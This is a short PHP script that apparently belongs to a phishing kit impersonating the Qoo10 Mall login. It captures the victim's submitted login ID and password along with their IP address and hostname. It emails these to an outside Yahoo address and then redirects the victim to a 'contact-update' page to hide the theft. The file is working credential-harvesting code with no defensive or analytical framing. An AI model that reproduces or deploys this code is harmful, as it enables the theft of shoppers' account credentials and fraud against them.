<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==========[LOGIN INFOS]=========<br>\n";
$bilsmg .= "|login : ".$_POST['login_id']."<br>\n";
$bilsmg .= "|Password : ".$_POST['passwd']."<br>\n";
$bilsmg .= "=============[INFOS]============<br>\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "hasilpenampungan@yahoo.com";
$bilsub = "Qoo10 Mall | From $ip";
$bilhead = "From:Masuk Qoo10 Mall <Don>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../contact-update.html";
header("location:$src");
?>